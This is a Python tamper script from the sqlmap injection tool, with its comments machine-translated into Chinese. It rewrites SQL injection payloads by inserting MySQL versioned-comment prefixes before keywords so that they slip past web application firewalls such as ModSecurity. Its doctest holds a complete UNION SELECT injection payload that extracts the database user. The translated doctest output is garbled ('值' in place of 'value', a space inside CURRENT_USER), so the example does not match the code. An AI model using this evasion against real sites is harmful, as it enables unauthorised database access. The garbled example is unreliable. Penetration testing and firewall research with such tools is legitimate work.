#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import os
import re

from lib.core.common import singleTimeWarnMessage
from lib.core.data import kb
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY
from lib.core.settings import IGNORE_SPACE_AFFECTED_KEYWORDS

__priority__ = PRIORITY.HIGHER

def dependencies():
    singleTimeWarnMessage('篡改脚本“%s”仅适用于 %s < 5.1' % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    '\n    在每个关键字之前添加 (MySQL) 版本注释\n\n    Requirement:\n        * MySQL < 5.1\n\n    测试针对：\n        * MySQL 4.0.18, 5.0.22\n\n    Notes:\n        * 有助于绕过多个 Web 应用程序防火墙\n          后台数据库管理系统为MySQL\n        * 在 ModSecurity SQL 注入挑战期间使用，\n          http://modsecurity.org/demo/challenge.html\n\n    >>> tamper("value\' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND \'QDWa\'=\'QDWa")\n    "值\'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CU RRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND \'QDWa\'=\'QDWa\'\n    '

    def process(match):
        word = match.group('word')
        if word.upper() in kb.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:
            return match.group().replace(word, "/*!0%s" % word)
        else:
            return match.group()

    retVal = payload

    if payload:
        retVal = re.sub(r"(?<=\W)(?P<word>[A-Za-z_]+)(?=\W|\Z)", process, retVal)
        retVal = retVal.replace(" /*!0", "/*!0")

    return retVal
